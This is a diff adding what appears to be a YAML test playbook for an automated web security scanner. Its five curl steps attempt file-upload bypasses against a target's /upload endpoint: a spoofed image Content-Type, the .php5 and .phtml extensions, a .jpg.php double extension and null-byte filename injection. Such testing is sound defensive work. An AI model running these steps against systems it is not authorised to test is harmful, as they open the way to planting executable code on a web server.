@@ -1,0 +1,26 @@
+steps:
+  - tool: curl
+    arguments:
+      url: "http://{target}/upload"
+      additional_args: '-s -L -X POST -F "file=@/tmp/test.php;type=image/jpeg" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'UPLOAD: PHP file upload with spoofed image/jpeg Content-Type'
+  - tool: curl
+    arguments:
+      url: "http://{target}/upload"
+      additional_args: '-s -L -X POST -F "file=@/tmp/test.php5;type=image/jpeg" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'UPLOAD: Alternative PHP extension (.php5) upload bypass test'
+  - tool: curl
+    arguments:
+      url: "http://{target}/upload"
+      additional_args: '-s -L -X POST -F "file=@/tmp/test.phtml;type=image/jpeg" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'UPLOAD: Alternative PHP extension (.phtml) upload bypass test'
+  - tool: curl
+    arguments:
+      url: "http://{target}/upload"
+      additional_args: '-s -L -X POST -F "file=@/tmp/test.jpg.php;type=image/jpeg" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'UPLOAD: Double extension bypass (.jpg.php) test'
+  - tool: curl
+    arguments:
+      url: "http://{target}/upload"
+      additional_args: '-s -L -X POST -F "file=@/tmp/test.php%00.jpg;type=image/jpeg" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'UPLOAD: Null byte injection in filename for extension bypass'
